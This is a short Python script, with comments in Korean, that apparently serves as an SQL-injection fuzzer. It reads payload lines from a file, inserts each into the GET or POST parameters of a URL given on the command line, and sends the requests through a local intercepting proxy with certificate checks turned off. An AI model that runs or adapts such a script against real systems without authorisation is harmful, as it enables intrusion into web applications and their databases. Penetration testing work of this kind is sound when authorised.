import requests
import urllib3
from datetime import datetime
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # ssl 인증서 에러 무시

# request 라이브러리 proxy 설정
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'https://127.0.0.1:8080'}

replacement_file = "./payload/payload.txt"
method_packet = sys.argv[1]
pretty_url = sys.argv[2]
fir_packet = sys.argv[3]
sec_packet = sys.argv[4]


payload_path = "./payload/payload.txt"
  
def attack(method):

    # packet
    if method == "GET":
        # sql injection 부분
        with open(payload_path, "r") as file:
            for line in file:
                replacement_file = line.strip() #for문을 넣어서 payload.txt내용을 한줄씩 불러오도록 수정해야함.
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')   # timestamp 기록
                headers = {'X-Custom-Header': timestamp}
                params = (fir_packet + replacement_file + sec_packet)
                r = requests.get(f'{pretty_url}?{params}',proxies=proxies, headers=headers, verify=False)
        file.close()
            # 결과 
        print(r.status_code)

    elif method == "POST":
        with open(payload_path, "r") as file:
             for line in file:
                replacement_file = line.strip() #for문을 넣어서 payload.txt내용을 한줄씩 불러오도록 수정해야함.
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')   # timestamp 기록
                headers = {'X-Custom-Header': timestamp}
                params = (fir_packet + replacement_file + sec_packet)
                r = requests.post(url = pretty_url,data= f'{params}',proxies=proxies, headers=headers, verify=False)
        file.close()
        print(r.status_code)
        
        
if method_packet == "GET":
    attack("GET") 
    print("SQL_GET")    

elif method_packet == "POST":
    attack("POST")
    print("SQL_POST")

